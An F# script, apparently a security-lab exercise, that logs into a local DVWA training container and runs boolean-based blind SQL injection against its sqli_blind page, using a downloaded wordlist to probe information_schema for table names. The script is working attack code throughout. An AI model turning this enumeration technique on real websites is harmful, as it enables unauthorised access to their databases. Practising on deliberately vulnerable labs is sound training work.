// Start the DVWA docker container by using:
// docker run --rm -it -p 80:80 vulnerables/web-dvwa


open System
open System.Net.Http
open System.IO
open System.Text.RegularExpressions


// Default settings for DVWA
let TARGET_URL = "http://localhost"
let AUTH = ["username", "admin"; "password", "password"]

/// Helper functions

// HTTP
let post (client: HttpClient) uri data = async {
    let content = new FormUrlEncodedContent(data)
    let! response = client.PostAsync(Uri uri, content) |> Async.AwaitTask
    return! response.Content.ReadAsStringAsync() |> Async.AwaitTask
}

let login (uri: string) = async {
    let client = new HttpClient()
    let! result = client.GetAsync(uri) |> Async.AwaitTask
    let! html = result.Content.ReadAsStringAsync() |> Async.AwaitTask
    let csrf_token = Regex("([a-z0-9]){32}").Match(html).Groups.[0].Value
    let data = dict (AUTH @ ["Login", "Login"; "user_token", csrf_token])
    let! logged = post client uri data 
    return match logged.Contains("<title>Welcome") with 
           | true  -> client
           | false -> failwith "Authentication failure"
}

let client: HttpClient = login $"{TARGET_URL}/login.php" |> Async.RunSynchronously

// Stream to Sequence
let streamToSeq (stream: Stream) = 
    let sr = new StreamReader(stream)
    seq { while not sr.EndOfStream do yield sr.ReadLine() }

// Build injection query
let buildInjection payload = $"{TARGET_URL}/vulnerabilities/sqli_blind/?Submit=Submit&id={payload}"

// Find out if a query is true
let testInjection injection = 
    let response = client.GetAsync(Uri injection)
    let stream = response.Result.Content.ReadAsStream()
    streamToSeq stream
    |> Seq.exists (fun line -> line.Contains("exists in the database"))

    
(*
    Method 1: Enumeration using a dictionary
*)

let DICT_URL = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt"
let fileName = DICT_URL.Split("/").[^0]

// Download the dictionary file if it doesn't exist yet
if not (File.Exists(fileName)) then
    let url = $"{DICT_URL}"
    use fileDict = new StreamWriter(fileName)
    client.GetAsync(Uri url).Result.Content.ReadAsStream()
    |> streamToSeq
    |> Seq.iter (fun line -> fileDict.WriteLine(line))

// List the tables in the database matching dictionary words
printfn "Tables found:"
let isInjection (word: string) =
    word.TrimEnd()
    |> sprintf "1' AND (SELECT 1 FROM information_schema.tables WHERE table_name = '%s') -- -"
    |> buildInjection
    |> testInjection
new FileStream(fileName, FileMode.Open)
|> streamToSeq 
|> Seq.filter isInjection
|> Seq.iter (fun table -> printfn $"\t{table}")